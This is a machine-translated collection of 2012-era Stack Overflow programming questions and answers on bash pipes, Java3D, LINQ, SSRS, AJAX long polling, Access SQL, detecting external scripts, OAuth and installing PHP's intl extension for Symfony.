     4      4 29078875555e113b31bd1ae876937d4b  /tmp/tst.xz

real    0m0.101s 
```

有了这个：

```
time  (
    i=1 pids=()
    for file in /tmp/tst.*;do
        cmd=$(which ${file##*.}) || {
            cmd=$(file -b --mime-type $file)
            cmd=$(which ${cmd#*-})
        }
        (
             read -a md5 < <($cmd -d <$file|md5sum)
             echo $i $md5 \ $file
        ) & pids+=($!)
      ((i++))
      done
    wait ${pids[@]}
) |
cat -n 
```

可以给：

```
 1      2 29078875555e113b31bd1ae876937d4b  /tmp/tst.gz
     2      1 29078875555e113b31bd1ae876937d4b  /tmp/tst.bz2
     3      4 29078875555e113b31bd1ae876937d4b  /tmp/tst.xz
     4      3 29078875555e113b31bd1ae876937d4b  /tmp/tst.lzma

real    0m0.070s 
```

其中排序取决于每个*fork*使用的类型。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-19T20:48:16.217

该`bash`手册提到了它如何`>(...)`使用命名管道或命名文件描述符来模拟语法，因此如果您不想依赖`bash`，也许您可​​以在脚本中手动执行此操作。

```
mknod FIFO
program3 < FIFO &
program1 | tee FIFO | program2
wait
rm FIFO 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-01-22T05:05:16.947

其他答案介绍了这个概念。这是一个实际的演示：

```
$ echo "Leeroy Jenkins" | tee >(md5sum > out1) >(sha1sum > out2) > out3

$ cat out1
11e001d91e4badcff8fe22aea05a7458  -

$ echo "Leeroy Jenkins" | md5sum
11e001d91e4badcff8fe22aea05a7458  -

$ cat out2
5ed25619ce04b421fab94f57438d6502c66851c1  -

$ echo "Leeroy Jenkins" | sha1sum
5ed25619ce04b421fab94f57438d6502c66851c1  -

$ cat out3
Leeroy Jenkins 
```

当然你可以`> /dev/null`代替out3。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-18T21:21:51.320

You can always try to save output of program1 to a file and then feed it into program2 and program3 input.

```
program1 > temp; program2 < temp; program3 < temp; 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2017-12-08T18:23:38.183

使用`(;)`语法...试试`ps aux | (head -n 1; tail -n 1)`***

# opengl - 如何回退到 Java3D 中的软件渲染？

> ID：10218106
> 
> 赞同：0
> 
> 时间：2012-04-18T21:13:12.283
> 
> 标签：opengl, windows-server-2008, direct3d, java-3d

我们在 Windows 的远程桌面上使用 Java3D 时遇到了一些奇怪的问题。远程机器是虚拟化服务器，不能使用（物理）服务器的显卡。当我运行该应用程序时，会弹出以下错误：

```
Unable to create DirectX D3D context.
Neither Hardware and Software Renderer are available.
Please update your video card drivers
and get the latest DirectX available at http://microsoft.com/directx 
```

切换到 OpenGL（使用 启动 JVM `-Dj3d.rend=ogl`）后，出现同样的错误！可能发生什么？出现错误时，如何回退到使用 OpenGL 或 DirectX 的软件渲染？

**编辑：**我已经尝试过使用另一个 OpenGL 供应商，使用 Mesa3D 的 DLL 而不是本机的，但它并没有什么不同。我还安装了 DirectX SDK 并尝试使用参考驱动程序 ( `-Dj3d.d3ddevice=reference`) 启动 Java3D，但它也不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T02:12:28.827

出现同样的错误是因为如果 OpenGL 失败，Java3D 会尝试使用 DirectX。如果这也失败了，则显示弹出窗口。

我没有设法解决它，因为我没有尝试在远程服务器上进行更改，而是尝试通过禁用视频驱动程序在我自己的机器上模拟问题。我仍然不知道为什么这两个问题不相等，但是在我回到服务器上工作并将 DirectX`d3dref9.dll`放在 Java 上`\bin`之后，它就起作用了。

`java.library.path`现在我遇到了一个全新的问题，因为如果我将 DLL 放在 JVM或 Tomcat 的:)上，JVM 将找不到它`\bin`：) 问题根本不存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-21T14:46:55.997

请尝试以下操作： 在 Windows 下：首先，通过右键单击桌面屏幕并选择菜单中的属性项来打开显示属性窗格。在该窗格中，显示“设置”选项卡，然后单击“高级”按钮。然后在打开的窗格的“疑难解答”选项卡中，检查“硬件加速”光标是否处于最大状态，确认您的选择并再次尝试运行您的程序。

如果之前的操作未能解决您的问题，请使用最新的可用驱动程序更新显卡的 OpenGL 和 DirectX 驱动程序，然后再次尝试运行 Sweet Home 3D。

# linux - 用于调用具有用户界面的外部程序的 Shell 脚本

> ID：10218116
> 
> 赞同：0
> 
> 时间：2012-04-18T21:13:51.540
> 
> 标签：linux, shell, io

## 我有一个外部程序，比如 a.out，它在运行时要求输入参数，即

./a.out

请选择 1 或 2：

1.  这会做一些事情

2.  这会做其他事情

* * *

然后当我输入“1”时，它会完成它的工作。我没有代码本身，只有二进制，所以无法更改。我想编写一个运行 a.out 并在其中插入“1”的 shell 脚本。

## 我尝试了很多事情，包括一些愚蠢的事情，比如：

./a.out 1

./a.out << 1

./a.out < 1

## 等等

但不工作。能否请您告诉我是否有任何方法可以编写例如 shell 脚本？谢谢，dbm368

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:18:17.160

我想你只需要一根管子。例如：

```
echo 1 | ./a.out 
```

一般而言，管道接受左侧程序写入的任何内容`stdout`并重定向到`stdin`右侧程序的。

# linq - LINQ 对比 Lambda 表达式

> ID：10218119
> 
> 赞同：0
> 
> 时间：2012-04-18T21:14:08.203
> 
> 标签：linq

据我了解，我们有 LINQ 和 Lambda 表达式。使用 Lambda 表达式是否更可取，因为它们提供了 LINQ 可能没有的更多功能。

```
 LINQ vs Lambda 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:16:40.760

我认为您的意思是`query`vs.`method`语法。

编译器会将查询语法转换为方法语法。性能是一样的。

```
var x = from p in XYZ where p.Property == "SomeValue" 
```

是相同的

```
var x = XYZ.Where(x => x.Property == "SomeValue") 
```

这更多是语法问题，取决于您想要做什么。可能性是一样的，性能是一样的。有时方法语法更容易阅读，有时查询语法更容易阅读。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:18:37.997

在我们的应用程序中，我们倾向于根据开发人员的偏好混合和匹配它们。我的经验法则是，如果查询需要 Join 或 Group By，我使用 Lamda，如果它是一个简单的过滤语句，我使用 LINQ。

两者最终都会产生一条 SQL 语句，我建议[http://www.linqpad.net/](http://www.linqpad.net/)查看由您的 LINQ 或 Lamda 语句产生的查询和执行计划。

# sorting - RRSR 排序我得到“tablix4 的排序表达式包括一个聚合函数”

> ID：10218122
> 
> 赞同：3
> 
> 时间：2012-04-18T21:14:16.043
> 
> 标签：sorting, ssrs-2008, grouping, reporting-services

我加你我对我的报告的看法

[一只忙碌的猫 http://s3.subirimagenes.com:81/imagen/previo/thump_7631306captura.png](http://s3.subirimagenes.com:81/imagen/previo/thump_7631306captura.png)

可以看到 group parent 是 NOM CLIENTE (ACCOUNT) 在每个 fecha(date) 有几个 pro code(product code) 后有一个子 group 叫 fecha(date)，每个 pro code 有一个 cantidad(quantity) , 每个 (pro codigo * cantidad) (product code * quantity) 都有它的 importe(amount) 所以，每个 fecha(date) 都有它的 importe (它当天购买的总数量) 现在每个客户都有一个总数量 (所有他/她的购买），现在我想对我的报告进行排序，但最后的总数量，你可以看到

```
837,25000
549,60000
1004,0000
369,50000
464,50000 
```

顺序应该是：

```
1004,0000
837,25000
549,60000
464,50000
369,50000 
```

当我在左上角进行排序并将此功能放在排序选项卡上时

`=Sum(Fields!importe.Value)`

我收到这条消息：

> 本地报表处理过程中发生错误。报告 /best_accounts 的定义无效 tablix 'Tablix4' 的排序表达式包括一个聚合函数。聚合函数不能用于数据行排序表达式。

那我怎么能按我的意愿排序呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-18T22:38:39.583

*   转到矩阵属性
*   选择组的选项卡
*   选择组的行并编辑它
*   您应该看到一个排序选项卡。
*   输入总表达式并选择 ASC 或 DESC

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-05T10:18:00.797

tablix 'Tablix3' 的排序表达式使用函数 RowNumber。RowNumber 不能用于排序表达式。

# php - AJAX 长轮询不保持连接打开

> ID：10218123
> 
> 赞同：0
> 
> 时间：2012-04-18T21:14:18.157
> 
> 标签：php, javascript, jquery, ajax, long-polling

在过去的两天里，我一直在努力让这个工作没有运气。它执行一次，但在初始加载后无法继续更新。该功能不会自动更新，也不会在 30 秒后重新启动。该代码对我来说似乎很好，但显然我对长轮询存在一些知识差距，这导致它不起作用。如果有人有时间，如果您能梳理一下并告诉我我做错了什么，我将不胜感激。任何帮助表示赞赏，谢谢。

JavaScript/jQuery

```
function poll(pid){
    var dataString = 'pid=' + pid;
    $.ajax({type: 'GET', url: 'http://localhost:8888/mysite/execs/vote_count.php', data: dataString, async: true, cache: false, success: function(data){

 var post = $('#' +pid);
    var post_children = post.children();
    var upvotes = post_children.find('.upvotes');
    var downvotes = post_children.find('.downvotes');

downvotes.text("-" + data.downvotes);
upvotes.text("+" + data.upvotes);

    }, dataType: "json", complete: poll, timeout: 30000 });
};

$(".post").each(function(){
poll($(this).attr("id"));
}); 
```

PHP (vote_count.php)

```
<?php
$hostname = 'localhost';
$username = 'root';
$password = 'root';
$database = 'database';
try {
    $dbh = new PDO("mysql:host=$hostname;dbname=$database", $username, $password);
    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $dbh->prepare("SELECT * FROM vote WHERE post = :pid AND rating = 'votedown'");
    $pid = $_GET['pid'];
    $stmt->bindParam(':pid', $pid, PDO::PARAM_STR);
    $stmt->execute();
    $result = $stmt->fetchAll();
    }
catch(PDOException $e)
    {
    echo $e->getMessage();
    }
    $stmt->execute();
    $downvotes = $stmt->rowCount();

    try {
    $dbh = new PDO("mysql:host=$hostname;dbname=$database", $username, $password);
    $dbh->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $dbh->prepare("SELECT * FROM vote WHERE post = :pid AND rating = 'voteup'");
    $pid = $_GET['pid'];
    $stmt->bindParam(':pid', $pid, PDO::PARAM_STR);
    $stmt->execute();
    $result = $stmt->fetchAll();
    }
catch(PDOException $e)
    {
    echo $e->getMessage();
    }
    $stmt->execute();
    $upvotes = $stmt->rowCount();
$arr = array("downvotes"=>$downvotes,"upvotes"=>$upvotes);
echo json_encode($arr);  
$dbh = null;
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T21:27:46.553

我认为您遇到的主要问题是您假设 complete: poll 将使用当前调用中传入的参数 pid 。试试这个。

```
function poll(pid){
    var dataString = 'pid=' + pid;
    $.ajax({type: 'GET', 
        url: 'http://localhost:8888/mysite/execs/vote_count.php', 
        data: dataString, 
        async: true, 
        cache: false, 
        success: function(data){
            var post = $('#' +pid);
            var post_children = post.children();
            var upvotes = post_children.find('.upvotes');
            var downvotes = post_children.find('.downvotes');

            downvotes.text("-" + data.downvotes);
            upvotes.text("+" + data.upvotes);
        }, 
        dataType: "json", 
        complete: function(xhr, status){
            setTimeout(function(){poll(pid);}, 30000);
        }, 
        timeout: 30000 
    });
}

$(".post").each(function(){
    poll($(this).attr("id"));
}); 
```

综上所述，如果您有很多帖子要检查更新，您可能会考虑将这些调用捆绑起来，并每 30 秒每页调用一次（并返回一组帖子更新），而不是每 30 秒每页每帖子调用一次. （我额外的两分钱。）

编辑：添加了提到的超时。第一次把它丢了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:39:35.563

我想一旦你收到回复..浏览器不会也不应该保持连接打开..这也很大程度上取决于你使用的浏览器和你发送的标题..我不是一个 PHP 人但是..标题shud 包含 Connection:Keep-alive 以保持连接打开。
. 还要通过我进行的各种测试。
1\. IE 不会保持现有连接打开，而是会同时打开 2 个连接，并保持第二个打开并关闭第一个。
2.Chrome 可以很好地发送 2 个请求（一个用于 favicon），但保持连接打开。
3\. Mozilla 只发送一个请求并保持打开状态。
你是用IE9来测试的吗？

# arrays - 在 Mathematica 中合并数组？

> ID：10218124
> 
> 赞同：1
> 
> 时间：2012-04-18T21:14:21.233
> 
> 标签：arrays, wolfram-mathematica

我有两个列表列表，可以这样概括：

```
a = {{1}, {2}, {3}};
b = {{4}, {5}, {6}}; 
```

我想将它们组合成一个列表，每个元素都在同一级别，ala：

```
 {{1}, {2}, {3}, {4}, {5}, {6}} 
```

除非我一辈子都做不到。最明显的事情是这样的：

```
In[537]:= Append[a, b]
Out[537]= {{1}, {2}, {3}, {{4}, {5}, {6}}} 
```

这不是我想要的。Append 文档似乎没有涵盖这样的案例，而且我无法得到任何 Appending 和 Flattening 的工作。我想我可以编写一个 for 循环并继续添加到一个空列表中，但天哪，这很笨拙。必须有一种优雅的方式来做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:22:42.570

更改您的代码：

```
In[537]:= Append[a, b] 
```

到：

```
In[537]:= Join[a, b] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T09:55:42.870

这不是最佳方式（PinnyM 提到了最佳方式），但您可以考虑

```
Flatten[Append[a,b]] 
```

或者干脆

```
Append[a,b]//Flatten 
```

这给出了相同的结果。

# .net - 将 XML 注释从源代码中移出

> ID：10218127
> 
> 赞同：1
> 
> 时间：2012-04-18T21:14:41.767
> 
> 标签：.net, visual-studio

有没有一种工具可以在代码库中提取我的 XML 注释并将它们放入 XML 文件中？我不想自己维护一个单独的文件，我想在完成后生成 XML 并从源代码中删除内容。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:59:39.800

您要求的方法的问题是，一旦您更改代码，您的“预编译的 xml”就会与它不同步（或者如果您想停止这种改进，您将不得不编辑 xml 文件手，这将比看到原始 XML 注释糟糕一千倍！）。我认为您真的应该考虑接受文档注释并充分利用使用它们带来的许多好处（直接和间接）。但如果你想这样做，你只需要启用 XML 文档输出的生成，重建项目，然后从 bin\debug 或 bin\release 文件夹中复制 XML 文件，然后开始削减和刻录。

但是，还有其他破坏性较小的选择：

*   您可以在工具 > 选项：环境 > 字体和颜色中更改文档注释的语法着色颜色。使用淡淡的颜色，评论将淡入背景。

*   也许如果评论更整洁，它们不会让你的眼睛流血。我编写了一个插件（[Atomineer Pro 文档](http://www.atomineerutils.com/)），它可以将各种格式选项应用于文档注释，使它们看起来更愉快：注释上方/下方的可选分隔符、条目中和周围的可选空格、可选的列对齐文本块、可选的自动换行等。或者如果 XML 标记真正受到伤害，它可以将您的评论转换为不那么刺耳的格式（它支持 Doxygen、JavaDoc 和 Qt 以及 XML 文档）。

*   我的插件还有一个选项，可以使用 VS 中的“大纲”工具来隐藏文档注释（按需或打开文档时）。它可能会通过隐藏文档注释来缓解您的一些症状。

*   从理论上讲，可以编写一个 VS2010 扩展来更改文档注释的显示以删除标记并显示更多所见即所得的表示。我还没有听说过任何事情，但现在可能有一些东西可以帮助你。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T21:54:29.980

您可以使用带有[/doc](http://msdn.microsoft.com/en-us/library/3260k4x7.aspx)开关的 Visual Studio 编译器。此选项在选项卡上的项目属性中也可用，`Build`并命名为`XML documentation file`. 它将生成带有注释的单独 XML 文件，然后 IntelliSense 可以使用这些注释。如果您要分发带有使用注释（实用程序库）的编译程序集，则可以使用它。还有一种叫做沙堡的东西。检查[此链接](http://msdn.microsoft.com/en-us/library/b2s063f7.aspx)

您还可以查看[NDoc](http://ndoc.sourceforge.net/)。它将根据您的 XML 注释生成代码文档。它是开源的。

如果您正在研究如何使评论不那么分散注意力，那么**将它们的颜色更改**为更淡的颜色会很有帮助（工具 -> 选项 -> 环境 -> 字体和颜色）。您还可以使用[宏](http://www.helixoft.com/blog/archives/30)来**折叠所有评论**。

无论如何，我建议在您的代码中留下注释 - 它使代码**更**易于维护。

# sql - VBA Access SQL - LIKE 运算符中的字段

> ID：10218129
> 
> 赞同：4
> 
> 时间：2012-04-18T21:14:52.130
> 
> 标签：sql, ms-access

我可以在 Like 运算符中使用表列吗？我创建了一个例子，

表A

```
Names                    Location 
Albert Smith Senior      Aberdeen  
John Lee                 London  
Michael Rogers Junior    Newcastle  
Mary Roberts             Edinburgh 
```

表B

```
Names  
Albert Smith  
John Lee  
Michael Rogers 
```

我想做一个查询，例如：

```
SELECT TableA.Location 
into NewTable 
FROM TableA
WHERE TableA.Names Like '*[TableB.Names]*'; 
```

在这种情况下，爱丁堡的 Mary Roberts 将没有匹配项，但将返回前三个位置。

是否可以将一列放入 like 语句中？如果没有，有人知道我该怎么做吗？

希望你能帮忙

PS我不能使用实际的星号，因为它被删除并且文本斜体，我也读过关于使用 % 的信息，但这对我不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:30:12.527

您可以连接两个表并`LIKE`在`JOIN`子句中使用：

```
SELECT TableA.Location
into NewTable 
FROM TableA
INNER JOIN TableB ON TableA.Names LIKE TableB.Names & '*'; 
```

老实说，在我刚刚尝试之前，我不知道您可以在 Access 中执行此操作 :-)

# javascript - Javascript：检测/防止外部脚本

> ID：10218132
> 
> 赞同：6
> 
> 时间：2012-04-18T21:15:14.537
> 
> 标签：javascript, html, load, xss, external

是否可以检测到可能被浏览器加载项、代理、xss 等加载到页面中的外部脚本？

假设我有这个网页：

```
<html>
    <head>
        <title>Hello world!</title>
        <script src="http://mydomain.com/script.js"></script>
    </head>
    <body>
        Hello world!
    </body>
</html> 
```

是否可以在我的`script.js`文件中包含一些脚本来检测页面上的*其他*脚本元素何时***不是***来自`http://mydomain.com`？

我想要一些可以检测*到源中包含的其他脚本（即它们在 onload 事件触发时存在）和**页面加载后*随时添加的脚本的东西。

如果我能检测到这些脚本，我还能以某种方式阻止它们吗？

如果我知道还有其他事情发生，这将有助于调试用户报告的 javascript/ui 问题。

我使用 jQuery，所以 jQuery 答案对我有用。我只是不想将答案仅限于 jQuery。

* * *

**编辑**

[我的解决方案](https://stackoverflow.com/a/10453353)如下。但是，它有两个（潜在的）问题：

1.  它依赖于 jQuery。
2.  它不会检测通过 CSS @import 规则（或任何具有`url()`值的规则）加载的外部资源。

如果有人想提交解决其中一个或两个问题的答案，我会投赞成票。

**如果你两个都解决了，我会接受你的回答。**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T21:30:11.033

您可以像这样检查 domready 上的所有脚本元素：

```
$(function () {
    $('script').each(function () {
        check script source here
    })
}) 
```

但是，如果有人可以在您身边注入脚本标签，他也可以在您开始检查之前删除您的代码，而且在您识别之前很难删除脚本可以创建的对象和函数。

所以我认为开始在这个领域投入时间并不是一个好的解决方案。更重要的是要清楚你无论如何都不能信任客户。

正如你想弄清楚的那样，有一堆[DOM 事件](https://developer.mozilla.org/en/DOM/DOM_event_reference)来检查 DOM 树是否已更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-04T17:20:17.290

我对收到的答案并不满意（尽管我很欣赏[Andreas Köberle 的建议](https://stackoverflow.com/a/10218328/)），所以我决定自己解决这个问题。

我编写了一个可以按需运行的函数，它可以识别任何具有外国来源的 html 元素。这样，我可以在报告 javascript 错误时运行它以获取有关环境的更多信息。

## 代码

取决于 jQuery（对不起，元素选择要容易得多）和`parseUri()`（复制在这个答案的底部）

```
/**
 * Identifies elements with `src` or `href` attributes with a URI pointing to
 * a hostname other than the given hostname. Defaults to the current hostname.
 * Excludes <a> links.
 * 
 * @param string myHostname The hostname of allowed resources.
 * @return array An array of `ELEMENT: src` strings for external resources.
 */
function getExternalSources(myHostname)
{
    var s, r = new Array();
    if(typeof myHostname == 'undefined')
    {
        myHostname = location.hostname;
    }
    $('[src], [href]:not(a)').each(function(){
        s = (typeof this.src == 'undefined' ? this.href : this.src);
        if(parseUri(s).hostname.search(myHostname) == -1)
        {
            r.push(this.tagName.toUpperCase() + ': ' + s);
        }
    });
    return r;
} 
```

## 用法

```
var s = getExternalSources('mydomain.com');
for(var i = 0; i < s.length; i++)
{
    console.log(s[i]);
}

// Can also do the following, defaults to hostname of the window:
var s = getExternalSources(); 
```

搜索包括子域，因此在上面的示例中允许使用具有`www.mydomain.com`or来源的元素。`img.mydomain.com`

**请注意，这不会在 CSS`@import`规则**（或任何带有 a`url()`的 CSS 规则）中获取外部资源。如果有人想贡献可以做到这一点的代码，我会投票并接受你的回答。

* * *

下面是`parseUri()`我从[https://gist.github.com/1847816](https://gist.github.com/1847816)获得的代码（并稍作修改）。

```
(function(w, d){
    var a,
        k = 'protocol hostname host pathname port search hash href'.split(' ');
    w.parseUri = function(url){
        a || (a = d.createElement('a'));
        a.href = url;
        for (var r = {}, i = 0; i<8; i++)
        {
            r[k[i]] = a[k[i]];
        }
        r.toString = function(){return a.href;};
        r.requestUri = r.pathname + r.search;
        return r;
    };
})(window, document); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:21:16.327

您可以侦听 DOM 中的更改并查看是否正在插入新的脚本标签。但我可以问，这种需要的原因是什么？我怀疑您是否能够检测到针对您页面的 DOM 执行某些任意 JS 的所有可能情况（例如，小书签或油脂猴脚本）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-18T21:30:06.960

我认为相同的原产地政策可能涵盖这一点： [http ://en.wikipedia.org/wiki/Same_origin_policy](http://en.wikipedia.org/wiki/Same_origin_policy)

# qt - 在处理运行时使用 CDB 进行调试时无法在 QT Creator 中设置断点

> ID：10218133
> 
> 赞同：1
> 
> 时间：2012-04-18T21:15:18.463
> 
> 标签：qt, qt-creator, windbg

在进程运行时使用 CDB 进行调试时，我无法在程序中设置断点。当我单击源代码行的左侧设置断点时，我得到了一个红色断点，上面有一个忙碌状态指示器。忙碌指示器永远不会像预期的那样消失。如果我在开始调试之前设置断点，它们将被成功应用。

如果我在进程运行时从菜单中选择 Debug->interrupt，QT Creator 也无法暂停进程。因此，我认为问题的原因是 QTC 无法暂停进程并应用断点。

如果我使用 GDB，一切都很好。但我不喜欢使用 GDB，因为它的编译速度要慢得多。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:22:04.770

Please check if you have the debugging tools for windows installed on your machine. [http://msdn.microsoft.com/en-us/windows/hardware/gg463009](http://msdn.microsoft.com/en-us/windows/hardware/gg463009)

Check if CDB finds the microsoft symbols.

Go to Tools >> Options >> Debugger

Check if the following path is present in Symbol Paths Text field:

C:\Program Files\Debugging Tools for Windows (x64) symsrv*symsrv.dll*C:\Users\vish6025\AppData\Local\Temp\symbolcache*http://msdl.microsoft.com/download/symbols

If it's your operating system is 32 bit, You point it to

C:\Program Files\Debugging Tools for Windows

# jquery - Jsonp 正在返回响应（在 firebug 网络窗口中），但它不在页面上输出

> ID：10218134
> 
> 赞同：0
> 
> 时间：2012-04-18T21:15:21.630
> 
> 标签：jquery, jsonp, github-api, gist

这是我尝试从 github 加载文件的工作示例：

```
<html>
<head><title>Get Gists</title>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
</head>
<body>
<script type="text/javascript">
$(document).ready(function() {
    var url =  "https://gist.github.com/2406934.js?file=check-jquery-load";
    $.getJSON(url + "?callback=?", null, function(gist) {
        alert(gist);
        $("#gist-info").append(gist);
    });
});
</script>
<div id='gist-info'></div>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:26:20.283

该 URL 未返回有效的 JSON。

来自[jQuery 文档](http://api.jquery.com/jQuery.getJSON/)：

重要提示：从 jQuery 1.4 开始，**如果 JSON 文件包含语法错误，请求通常会静默失败**。因此，请避免频繁手动编辑 JSON 数据。JSON 是一种数据交换格式，其语法规则比 JavaScript 的对象文字表示法更严格。例如，在 JSON 中表示的所有字符串，无论是属性还是值，都必须用双引号括起来。有关 JSON 格式的详细信息，请参阅[http://json.org/](http://json.org/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:25:33.530

您在这里几乎有两个问题。跨域以及返回的片段不完全是 JSON 的事实。它介于 HTML 和 Javascript 之间。

您肯定需要一个辅助方法来解析返回的对象，因为它正在执行*document.write()*。

请参阅以下链接，它几乎可以解决您遇到的相同问题： [Loading GitHub Gist](http://www.bennadel.com/blog/2312-Loading-GitHub-Gists-After-The-Page-Content-Has-Loaded.htm)

这就是你的*Gist*放在一起时的样子： [链接](http://plunker.no.de/edit/Piv3LT)

# security - 具有同源策略和 OAuth 的 REST API 身份验证

> ID：10218136
> 
> 赞同：3
> 
> 时间：2012-04-18T21:15:53.847
> 
> 标签：security, authentication, oauth, asp.net-web-api

我正在编写一个供我的 JavaScript 应用程序使用的 API（相同的域，API 在`api.example.com`和站点`example.com`以及第 3 方开发人员（移动设备、桌面等）。现在我想使用 OAuth，但我不知道工作流程是怎样的当同时使用 OAuth 和使用具有相同来源策略的应用程序时。

如何在我的 Web 应用程序中对用户进行身份验证？当我发送用户名和密码时，我可以检查请求是否来自我的域，然后返回令牌吗？令牌将存储在 cookie 中，并在每次请求时发送回服务器。所以有2个部分：

1.  如果请求来自我的域，只需检查令牌，否则会抛出 HTTP 异常。
2.  如果不是我的域，请执行 OAuth 身份验证。

这可能吗？如何在 asp.net Web API 中进行设置？（主要是关于检查请求是否在同一个域中的部分）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T10:11:34.203

我猜要登录到您的网络应用程序，您没有使用 OAuth，而只是接受用户名和密码并开始会话？如果是这样，您实际上不必为自己的站点使用 OAuth。

将会话cookie 设置为有效`*.example.com`，您应该能够在`site.example.com`和上验证该 cookie `api.example.com`。

例子：

1.  请求进入`api.example.com/verify_credentials.json`
2.  如果 OAuth 验证成功，则提供响应。
3.  如果没有，请尝试 Cookie 验证 - 如果成功则服务
4.  `402 Unauthorized`如果两者都失败则返回。

这是一个关于跨子域共享 cookie 的线程：[ASP.NET Subdomain Cookie (parent and one subdomain)](https://stackoverflow.com/questions/2172490/asp-net-subdomain-cookie-parent-and-one-subdomain)

# php - Symfony 2：安装并启用 intl 扩展

> ID：10218137
> 
> 赞同：11
> 
> 时间：2012-04-18T21:15:54.113
> 
> 标签：php, windows, symfony, xampp

我正在使用`XAMPP for Windows`并决定尝试一下`Symfony 2`。

一旦我进入`Symfony Configuration`页面，它就会建议我安装并启用**intl**。

我尝试阅读`PEAR's`和`PECL's`指南，因为我在这个主题上的总分是**0**`PHP` （最近开始学习），但没有任何效果。

我`php_intl.dll`在我的`C:\xamp\php\ext`. 的设置为`php.ini`。我只是缺少内部，所以我添加了它。`extension_dir=``"C:\xampp\php\ext"``extension=php_intl.dll``php.ini`

不幸的是，它没有用，并`Symfony`一直向我询问**intl**。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-13T20:43:52.960

每当你进行更改时`php.ini`，记得重新启动`Apache`。否则更改不会生效。您可以`XAMPP Control Panel`通过单击模块行`stop/start`中的按钮来执行此操作。`Apache`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-18T21:21:18.110

[http://php.net/manual/en/intl.requirements.php](http://php.net/manual/en/intl.requirements.php)

> This extension is bundled with PHP as of PHP version 5.3.0. Alternatively, the PECL version of this extension may be used with all PHP versions greater than 5.2.0 (5.2.4+ recommended).

also read my comment to your post above

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-02-05T07:46:15.393

按着这些次序：

1.  从*C:\wamp\bin\php\php5.5.12复制所有以“* **icu** ”开头的文件名并粘贴到*C:\wamp\bin\apache\apache2.4.9\bin*（我使用的是 WAMP。自己弄清楚对于 XAMP。）

 **你可以试试。什么都不会伤害。如果您觉得这些东西不起作用，您可以删除它们。我相信它会 100% 为你工作。

2.  取消注释 C:\wamp\bin\apache\apache2.4.9\bin\php.ini 上的以下行

    ```
    extension=php_intl.dll 
    ```

它会起作用的。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-11-03T07:40:17.150

对于 Linux 用户：安装 php5-intl 使它对我有用

```
sudo apt-get install php5-intl 
```

在这里找到： [http ://www.php.net/manual/en/intl.setup.php](http://www.php.net/manual/en/intl.setup.php)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-01-04T20:55:23.893

# 对于 OS X 用户：

1\. 通常，PHP 会自动安装在 OSX 上。因此，如果您想使用 XAMPP 或任何 apache 服务器，您必须将路径点更改为 XAMPP。您可以使用以下命令检查路径：

```
$ which php 
```

*（不要复制 $ 符号，这意味着你应该在终端中输入这个，而不是 php）*

你应该得到：`/Applications/XAMPP/xamppfiles/bin/php`，

如果没有，你会得到`/usr/bin/php`.

这是 OSX 的 php。因此，您必须使用以下命令将其更改为 XAMPP' php：

```
$ PATH="/Applications/XAMPP/xamppfiles/bin:${PATH}" 
```

2.运行这个命令来下载、解压、编译和安装ICU（你可以选择不同的版本是你需要的Symfony）：

```
$ curl -sS -o /tmp/icu.tar.gz -L http://download.icu-project.org/files/icu4c/57.1/icu4c-57_1-src.tgz && tar -zxf /tmp/icu.tar.gz -C /tmp && cd /tmp/icu/source && ./configure --prefix=/usr/local && make && sudo make install 
```

比运行：

```
$ sudo pecl install intl 
```

并指定在哪里可以找到 ICU 库和头文件 [DEFAULT]：

```
/usr/local 
```

注意安装报告中的信息：

```
You should add "extension=intl.so" to php.ini 
```

不要忘记重新启动 Apache 并检查版本：

```
<?php
if (extension_loaded('intl')) {
    echo "PHP: " . PHP_VERSION . "<br>\n";
    echo "ICU: " . INTL_ICU_VERSION . "<br>\n";
} else {
    die('OOPS! The intl extension is not enabled!');
} 
```

部分取自此处，但经过修改以获得成功[在 Mac 上的 XAMPP 上安装 PHP 国际化扩展 (Intl)](https://stackoverflow.com/questions/34597100/install-php-internationalization-extension-intl-on-xampp-on-mac)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-01-29T11:00:29.323

